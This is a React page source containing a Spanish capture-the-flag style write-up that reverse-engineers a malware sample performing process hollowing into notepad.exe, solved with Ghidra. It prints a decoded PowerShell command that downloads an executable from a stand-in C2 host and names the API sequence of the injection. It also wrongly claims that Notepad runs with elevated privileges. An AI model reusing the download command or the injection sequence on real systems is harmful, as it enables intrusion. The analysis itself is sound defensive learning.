import Head from 'next/head'
import Image from 'next/image'
import { Inter } from 'next/font/google'
import styles from '@/styles/Home.module.css'

import { useEffect, useState } from 'react'

import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter';

const inter = Inter({ subsets: ['latin'] })

const c_code = `BOOL CreateProcessA(
    LPCSTR                lpApplicationName,
    LPSTR                 lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL                  bInheritHandles,
    DWORD                 dwCreationFlags,
    LPVOID                lpEnvironment,
    LPCSTR                lpCurrentDirectory,
    LPSTARTUPINFOA        lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
    );
                      
    {
        //...
        LPCSTR lpApplicationName = "C:\\ruta\\al\\programa.exe";
        LPSTR lpCommandLine = "arg1 arg2 arg3";
        LPSECURITY_ATTRIBUTES lpProcessAttributes = NULL;
        LPSECURITY_ATTRIBUTES lpThreadAttributes = NULL;
        BOOL bInheritHandles = FALSE;
        DWORD dwCreationFlags = 0;
        LPVOID lpEnvironment = NULL;
        LPCSTR lpCurrentDirectory = "C:\\ruta\\al\\directorio";
        STARTUPINFOA startupInfo;
        PROCESS_INFORMATION processInfo;
                  
        CreateProcessA(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, &startupInfo, &processInfo);
        //...
    }`;

const asm_code = `ADD        ESP,0x18
MOV        EDI,EAX
XORPS      XMM0,XMM0
PUSH       EBX
PUSH       ESI
PUSH       0x0
PUSH       0x0
PUSH       0x4
PUSH       0x1
PUSH       0x0
PUSH       0x0
MOVUPS     xmmword ptr [EDI],XMM0
PUSH       s_c:\windows\syswow64\notepad.exe_004031c0

MOVQ       qword ptr [EDI + 0x10],XMM0

PUSH       0x0
MOV        dword ptr [EBP + local_14],0x0

CALL       dword ptr [->KERNEL32.DLL::CreateProcessA]`;

const asm_decoded = `CreateProcessA(
  (LPCSTR)0x0,
  "c:\\windows\\syswow64\\notepad.exe",
  (LPSECURITY_ATTRIBUTES)0x0,
  (LPSECURITY_ATTRIBUTES)0x0,
  1,
  4,
  (LPVOID)0x0,
  (LPCSTR)0x0,
  lpStartupInfo,
  lpProcessInformation
);`;

export default function InjectionSeriesWriteup() {
    const [ style, setStyle ] = useState({})
  useEffect(() => {
    import('react-syntax-highlighter/dist/cjs/styles/prism/twilight')
    .then(mod => setStyle(mod.default));
  })

    return (
        <>
            <section className="hero is-info is-large banner">
                <div className="hero-head">
                    <nav className="navbar">
                        <div className="container">
                            <div className="navbar-brand">
                                <a className="navbar-item" href="/home">
                                    <h1 className="title has-text-light" style={{ fontFamily: 'Share Tech Mono' }}>FORENSE EN POTENCIA</h1>
                                </a>
                                <span className="navbar-burger" data-target="navbarMenuHeroB">
                                    <span></span>
                                    <span></span>
                                    <span></span>
                                </span>
                            </div>
                            <div id="navbarMenuHeroB" className="navbar-menu">
                                <div className="navbar-end">
                                    <a className="navbar-item" href="/home">
                                        Principal
                                    </a>
                                    <a className="navbar-item">
                                        Blog
                                    </a>
                                    <a className="navbar-item">
                                        Contacto
                                    </a>
                                </div>
                            </div>
                        </div>
                    </nav>
                </div>

                <div className="hero-body">
                    <div className="container has-text-centered">
                        <p className="title">
                            Injection Series: Part V
                        </p>
                        <p className="subtitle">
                            WriteUp Detallado
                        </p>
                    </div>
                </div>

                <div className="hero-foot">
                    <nav className="tabs is-boxed is-fullwidth">
                        <div className="container">
                            <ul>
                                <li>
                                    <a>Part 1</a>
                                </li>
                                <li>
                                    <a>Part 2</a>
                                </li>
                                <li>
                                    <a>Part 3</a>
                                </li>
                                <li className="is-active">
                                    <a>Part 4</a>
                                </li>
                            </ul>
                        </div>
                    </nav>
                </div>
            </section>

            <section className="container">
                <div className="box has-background-black-ter has-text-light has-text-left mt-5">
                    <h1 className="title has-text-light">Primeras Nociones</h1>

                    <div className="content">
                        <p>"Realiza ingeniería inversa sobre el programa dado y analiza su comportamiento.
                            Puedes utilizar cualquier desensamblador que desees para completar este desafío."</p>

                        <p>Es el texto con el que se nos presenta este desafío, y si observamos bien, veremos que contiene el
                            archivo ejecutable justo debajo de esta:</p>

                        <img src="/assets/Injection-Series/iseries4-ss1.png"></img>

                        <p>Entonces descomprimimos el archivo con la contraseña mostrada en la página del &quot;challenge&quot; o desafío,
                            entonces, una vez descomprimido, nos topamos con que incluye un ejecutable MS-DOS llamado &quot;re4.exe". Al
                            descomprimirlo, lo primero que se me pasa por la cabeza es revisar los strings, entonces, procedo a
                            hacerlo y me encuentro con algo curioso:</p>

                        <img src="/assets/Injection-Series/iseries4-ss2.png"></img>

                        <p>¿Alcanzas a divisar algo extraño en esta pequeña imágen?</p>
                        <p>Comenzando por el hecho de que ejecuta un código powershell que se encuentra codificado en base64, y al
                            descodificarlo, nos muestra:</p>
                        <p className="has-text-warning">Invoke-WebRequest -Uri http://somec2.server/exp.exe -OutFile
                            c:\\windows\\temp\\exp.exe</p>
                        <p>Entonces nos damos cuenta de que descarga un archivo desde <span
                            className="has-text-danger">somec2.server</span>, usando <span
                                className="has-text-danger">Invoke-WebRequest</span> y lo guarda en <span
                                    className="has-text-danger">C:\\windows\\temp\\exp.exe</span>, además de eso, notamos la presencia de
                            &quot;notepad.exe", creo que más adelante revisaremos eso... Con esto tenemos la respuesta de las preguntas 3
                            y 4.</p>
                        <p>Abramos este ejecutable entonces en <a className="has-text-link"
                            href="https://es.wikipedia.org/wiki/Ghidra">GHidra</a>.</p>
                    </div>
                </div>
            </section>

            <section className="container">
                <div className="box has-background-black-ter has-text-light has-text-left mt-5">
                    <h1 className="title has-text-light enable-line-break">Análisis y descompilación con GHidra</h1>

                    <div className="content">
                        <img src="/assets/Injection-Series/iseries4-ss3.png"></img>

                        <p>Entonces, ¿recuerdas la aparición de Notepad.exe en los strings del ejecutable?, pues ahora es importante
                            disponernos a analizar exactamente qué estaba haciendo el pobre notepad ahí, por lo que entonces:</p>

                        <img src="/assets/Injection-Series/iseries4-ss4.png"></img>

                        <p>Nos damos entonces cuenta de que se está invocando el proceso &quot;<span
                            className="has-text-danger">notepad.exe</span>&quot; a través de la llamada &quot;<span
                                className="has-text-danger">CreateProcessA</span>", la cual: </p>

                        <p>CreateProcessA es una función de la API de Windows utilizada para crear un nuevo proceso en un entorno
                            Windows. Esta función permite a los programadores iniciar un nuevo programa como un proceso
                            independiente en el sistema operativo. Algunos de los parámetros clave de CreateProcessA incluyen la
                            ruta al archivo ejecutable que se desea lanzar, los argumentos de la línea de comandos, información
                            sobre el proceso hijo y opciones de creación del proceso. Esta función es ampliamente utilizada en la
                            programación de aplicaciones para Windows para iniciar nuevos programas y realizar tareas de gestión de
                            procesos. La &quot;A&quot; en CreateProcessA se refiere a la versión ANSI de la función, que maneja cadenas de
                            caracteres en formato ANSI, mientras que existe una versión &quot;W&quot; (CreateProcessW) que maneja cadenas de
                            caracteres en formato Unicode (UTF-16).</p>

                        <p>Tenemos ya entonces la respuesta a nuestra primer pregunta, <span className="is-underlined">¿verdad?</span>
                        </p>

                        <p>Leyendo más sobre esta función, encontramos sus Parámetros Principales:</p>

                        <p><span className="has-text-warning">lpApplicationName:</span> Es el nombre del archivo ejecutable que se desea
                            iniciar. Puede ser la ruta completa al archivo o solo el nombre si el archivo se encuentra en una
                            ubicación incluida en la variable de entorno PATH.</p>
                        <p><span className="has-text-warning">lpCommandLine:</span> Aquí se especifican los argumentos de la línea de
                            comandos que se pasan al proceso que se está creando. Esto puede incluir opciones y argumentos
                            específicos para el programa.</p>
                        <p><span className="has-text-warning">lpProcessAttributes y lpThreadAttributes:</span> Estos parámetros permiten
                            especificar atributos de seguridad para el proceso y los hilos que se crean.</p>
                        <p><span className="has-text-warning">bInheritHandles:</span> Indica si el proceso hijo debe heredar los
                            identificadores de archivo abiertos del proceso padre.</p>
                        <p><span className="has-text-warning">dwCreationFlags:</span> Define diversas opciones para el proceso, como si
                            debe ejecutarse en una ventana propia, si debe ser un proceso en segundo plano, etc.</p>
                        <p><span className="has-text-warning">lpEnvironment:</span> Permite establecer un entorno de variables de
                            entorno específico para el proceso hijo.</p>
                        <p><span className="has-text-warning">lpCurrentDirectory:</span> Establece el directorio de trabajo actual para
                            el proceso hijo.</p>
                        <p><span className="has-text-warning">lpStartupInfo:</span> Un puntero a una estructura STARTUPINFO que se
                            utiliza para configurar la apariencia y el comportamiento del proceso hijo.</p>
                        <p><span className="has-text-warning">lpProcessInformation:</span> Un puntero a una estructura
                            PROCESS_INFORMATION que recopila información sobre el proceso hijo después de que se crea.</p>

                        <p>Algo así en código C:</p>
                        <SyntaxHighlighter language="ruby" style={style}>{c_code}</SyntaxHighlighter>

                        <p>Entonces, si analizamos bien la pieza de código que hace referencia a la función CreateProcessA:</p>
                        <SyntaxHighlighter language="nasm" style={style}>{asm_code}</SyntaxHighlighter>
                        <SyntaxHighlighter language="nasm" style={style}>{asm_decoded}</SyntaxHighlighter>

                        <p>Nos daremos cuenta de que se pasa &quot;4&quot; como valor al argumento dwCreationFlags, entonces, si nos vamos a
                            la documentación de la API de windows en el header procthread.h, nos muestra que el flag correspondiente
                            al valor &quot;0x00000004&quot; es <span className="has-text-danger">CREATE_SUSPENDED</span>, y nos muestra: <br />

                            &quot;El hilo primario del nuevo proceso se crea en un estado suspendido, y no se ejecuta hasta que se llama
                            a la función <span className="has-text-danger">ResumeThread</span>. <br />

                            <span className="is-underlined">Tenemos ya la segunda pregunta.</span>
                        </p>
                    </div>
                </div>
            </section>

            <section className="container">
                <div className="box has-background-black-ter has-text-light has-text-left mt-5">
                    <div className="content">
                        <p>La quinta pregunta se nos plantea como &quot;Justo después de las instrucciones de descarga del archivo, una
                            función de ntdll ha sido cargada e invocada por la muestra. ¿Cuál es el nombre de la función?"</p>
                        <p>No hace falta ser un grandioso observador para darse cuenta, por lo que simplemente observamos el código
                            descompilado y buscamos alguna función relacionada, hasta terminar encontrando llamadas a la función
                            &quot;<span className="has-text-danger">NtUnmapViewOfSection</span>"</p>
                        <p>La función NtUnmapViewOfSection en Windows se utiliza para descartar una vista de memoria virtual
                            previamente mapeada a partir de una sección de memoria. Esto significa que se desvincula una región
                            específica de la memoria virtual de una sección de memoria, liberando así los recursos asociados con esa
                            vista.</p>
                        <p>Esta función es parte de la API de llamadas al sistema de Windows NT, y su uso no es típico para
                            aplicaciones de usuario. Normalmente, las aplicaciones de usuario interactúan con la administración de
                            memoria a través de funciones de la API de usuario de Windows, como VirtualFree o UnmapViewOfFile, que
                            son más seguras y más fáciles de usar.</p>
                        <p>En teoría, si un programa malicioso logra llamar a funciones de bajo nivel del kernel como
                            NtUnmapViewOfSection, podría realizar operaciones que normalmente están fuera de los límites de una
                            aplicación de usuario. Esto podría dar lugar a problemas de seguridad y escalada de privilegios si se
                            explotan vulnerabilidades en el sistema operativo.</p>

                        <img src="/assets/Injection-Series/iseries4-ss4.png"></img>
                    </div>
                </div>
            </section>

            <section className="container">
                <div className="box has-background-black-ter has-text-light has-text-left mt-5">
                    <div className="content">
                        <p>La sexta pregunta nos dice entonces: &quot;Después de la asignación de memoria y escribir la fecha en la
                            memoria asignada. ¿Cuáles son las 2 API utilizadas para actualizar el punto de entrada y reanudar el
                            hilo?"</p>

                        <p>Habiendo contestado ya la segunda pregunta, no debería ser muy difícil intuír de qué función nos podría
                            estar hablando, ¿verdad?</p>

                        <img src="/assets/Injection-Series/iseries4-ss5.png"></img>

                        <p><span className="has-text-danger">SetThreadContext</span> es una función de la API de Windows que se utiliza
                            para establecer el contexto de un subproceso con los valores modificados. En este caso, se utiliza para
                            establecer el contexto del subproceso al que se le ha modificado el valor de EAX.</p>
                        <p><span className="has-text-danger">ResumeThread</span> es una función de la API de Windows que se utiliza para
                            reanudar la ejecución de un subproceso que previamente ha sido suspendido. Cuando un subproceso se
                            suspende, su ejecución se detiene temporalmente. Utilizando ResumeThread, puedes reanudar la ejecución
                            del subproceso.</p>

                        <p className="is-underlined">Entonces tenemos ya la pregunta 6 contestada</p>
                    </div>
                </div>
            </section>

            <section className="container">
                <div className="box has-background-black-ter has-text-light has-text-left mt-5">
                    <div className="content">
                        <h1 className="title has-text-light">Resumen de lo encontrado</h1>
                        <img src="/assets/Injection-Series/iseries4-ss7.png"></img>

                        <p>La técnica MITRE empleada es la inyección de procesos, esta se da cuando un programa malicioso injerta
                            código malicioso dentro de otro proceso, consiguiendo así escalar privilegios.</p>

                        <h2 className="subtitle is-size-4 has-text-light">Hallazgos clave:</h2>
                        <ul>
                            <li>El malware utiliza la función CreateProcessA de la API de Windows para crear un nuevo proceso
                                Notepad.exe.</li>
                            <li>El malware suspende el proceso Notepad.exe.</li>
                            <li>El malware descarga un archivo ejecutable malicioso desde un servidor remoto.</li>
                            <li>El malware inyecta el código malicioso del archivo ejecutable malicioso en el proceso Notepad.exe.
                            </li>
                            <li>El malware reanuda el proceso Notepad.exe.</li>
                        </ul>

                        <h2 className="subtitle is-size-4 has-text-light">Consecuencias</h2>
                        <p>La inyección de procesos es una técnica de malware que permite a un programa malicioso inyectar código
                            malicioso en otro proceso en ejecución. Esto se puede utilizar para escalar privilegios y obtener acceso
                            a recursos y datos que normalmente no estarían disponibles para el malware.</p>

                        <p>En este caso, el malware inyecta código malicioso en el proceso Notepad.exe, que tiene privilegios
                            elevados. El código malicioso luego descarga un archivo ejecutable malicioso que también tiene
                            privilegios elevados. Esto permite al malware escalar privilegios y obtener acceso a recursos y datos
                            confidenciales.</p>

                        <h2 className="subtitle is-size-4 has-text-light">Recomendaciones</h2>
                        <p>Para protegerse de la técnica de inyección de procesos, es importante tomar las siguientes medidas:</p>
                        <ul>
                            <li>Mantener el sistema operativo y las aplicaciones actualizados.</li>
                            <li>Utilizar una solución antivirus y antimalware actualizada.</li>
                            <li>Implementar controles de seguridad para limitar la ejecución de código no autorizado.</li>
                        </ul>
                    </div>
                </div>
            </section>
        </>
    )
}